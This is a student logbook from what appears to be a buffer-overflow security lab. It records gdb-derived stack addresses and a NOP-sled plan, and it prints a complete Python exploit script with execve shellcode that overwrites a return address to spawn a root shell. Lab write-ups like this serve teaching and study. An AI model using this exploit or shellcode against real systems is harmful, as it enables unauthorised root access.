# Log Book 5

## Task 1

Both versions of the shellcode (32 and 64 bit) spawn a shell. We can run
commands on this shell as usual, but deleting characters doesn't given visual
feed. Deleting a char from the command line deletes it fromm the buffer, but it
remains on screen.

The environment of these shells includes both a PWD and OLDPWD:. It also
includes a SHLVL variable. No PATH environment variabl is defined.

![task 1 pt.1](./LOGBOOK5_img/task_1.png)

![task 1 pt.2](./LOGBOOK5_img/task_1_2.png)

## Task 2

There are 4 executable with slightly different configs (**DBUF_SIZE**):

- L1 - 100
- L2 - 160
- L3 - 200
- L4 - 10

We'll use L1 for task 3.

## Task 3

This executable was compiled for 32-bit and, using the instructions in the lab
pdf, we obtained the following information concerning the address of the buffer
and the frame pointer.

```
gdb-peda$ p $ebp
$1 = (void *) 0xffffcaa8

gdb-peda$ p &buffer
$2 = (char (*)[100]) 0xffffca3c
```

### How to attack

We'll place our shell code in a region above the return address location and
change the return address to point to that location.

### Stack pointer

The frame pointer is pointing to the address of the **last frame pointer.**. The
last frame pointer is a 32-bit value: 4 byte. With this, we know the stack
pointer, **sp**, is at `sp + 4 = 0xffffcaa8 + 4 = 0xffffcaac`.

### The attack

We have a 517 byte buffer to use. We'll start by filling it with **NOPs**, and
then place our shellcode at the end of this buffer. These **NOPs** will be
helpful later since we can just point the return address no anywhere in this
region and the shellcode will be eventually reached (less precision required).

We can calculate that the offset between the buffer address and the frame
pointer, `fp - buf_addr`, is **108**.

With all of these in mind, we can place the address of the start of the
shellcode as the return address: `buf_addr + start`.

When the function attempts to return, it will jump to the shellcode and spawn a
shell.

### Exploit code

```py
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
fp = 0xffffcaa8
sp = fp + 4
buf_addr = 0xffffca3c

# buf_fp_offset
start = len(content) - len(shellcode)
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret    = buf_addr + start
offset = sp - buf_addr

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

### Results

We managed to spawn a root shell. By including the assembly code for the
`setuid(0)` system call before the shellcode, we were able to spawn a root shell
on dash, bypassing its mitigation.

![task 3](./LOGBOOK5_img/task_3.png)
